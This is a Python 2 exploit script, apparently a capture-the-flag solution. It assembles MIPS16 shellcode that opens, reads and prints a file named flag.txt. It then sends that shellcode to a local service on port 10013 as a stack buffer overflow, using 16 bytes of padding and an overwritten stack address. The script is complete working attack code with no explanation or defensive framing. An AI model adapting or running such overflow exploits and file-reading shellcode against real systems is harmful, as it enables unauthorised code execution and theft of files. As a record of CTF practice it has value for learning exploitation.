asm = '''.section .text
.global _start
.ascii "%s"
_start:
get_addr:
  # mips -> mips16
  # bal get_pc
  .word 0x04110001
  .word 0x00000000
  # move $a0, $31
  .word 0x03e02021
  # addi $a0, #21
  .word 0x20840015
  .word 0x00000000
  # br $a0
  .word 0x00800008
  .word 0x00000000

  move $v1, $a0
  move $a3, $a0
  addiu $v1, 1
  addiu $a3, 75
open:
  addiu $v1, 38
  move $a0, $a3
  move $a1, $zero
  move $a2, $zero
  jalr $v1
read:
  addiu $v1, 12
  move $a0, $v0
  move $a1, $a3
  li $a2, 0x7f
  jalr $v1
write:
  addiu $v1, 12
  li $a0, 1
  move $a1, $a3
  li $a2, 0x7f
  jalr $v1
open2:
  .word 0x00000305
  .word 0xe8206500
  .word 0x65006500
read2:
  .word 0x00000385
  .word 0xe8206500
  .word 0x65006500
write2:
  .word 0x00000405
  .word 0xe8206500
  .word 0x65006500
.ascii "%s"
'''

import os
from lib.mylib import *

ARCH = 'mips16'
AS = 'mips-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -mips16 -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10013
s = mysock(IP, PORT)
s.send('\n000')
SP = 0x800006f4
shellcode = 'AAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
